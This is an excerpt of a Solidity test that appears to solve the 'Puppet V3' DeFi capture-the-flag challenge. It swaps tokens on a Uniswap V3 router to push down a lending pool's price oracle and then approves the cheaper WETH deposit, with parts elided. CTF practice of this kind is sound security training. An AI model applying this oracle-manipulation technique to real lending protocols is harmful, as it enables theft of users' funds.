...
contract PuppetV3Challenge is Test {
    ...
    function test_puppetV3() public checkSolvedByPlayer {
        console.log("beforeSwap weth needed",lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE) / 1 ether);
        
        bool isWethFirst = address(weth) < address(token);
        console.log("isWeth", isWethFirst);
        // token is first and second is weth
        ...
        // Swap tokens for ETH        
        uint256 amountOut = ISwapRouter(uniswapRouterAddress).exactInputSingle(
        ...
        console.log("afterSwap weth needed",lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE));

        uint256 needed = lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE);
        weth.approve(address(lendingPool), needed);
